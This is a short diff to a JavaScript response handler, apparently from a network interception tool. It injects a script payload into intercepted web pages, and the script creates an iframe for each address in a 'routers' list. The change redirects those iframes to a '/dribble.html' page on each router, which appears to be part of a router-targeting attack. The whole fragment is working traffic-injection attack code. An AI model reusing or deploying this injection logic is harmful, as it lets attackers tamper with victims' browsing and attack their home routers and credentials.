@@ -18,7 +18,7 @@ function onResponse(req, res) {
 	// set payload
 	var payload = "document.addEventListener(\"DOMContentLoaded\", function(event){\n";
 	for(var i=0; i < routers.length; i++){
-		payload = payload + "var ifrm = document.createElement('iframe');\nifrm.setAttribute('src', 'http://"+routers[i]+"');ifrm.style.width = '640px';ifrm.style.height = '480px';\ndocument.body.appendChild(ifrm);\n";
+		payload = payload + "var ifrm = document.createElement('iframe');\nifrm.setAttribute('src', 'http://"+routers[i]+"/dribble.html');ifrm.style.width = '640px';ifrm.style.height = '480px';\ndocument.body.appendChild(ifrm);\n";
 		//console.log(routers[i]);
 	}
 	payload = payload + "});";
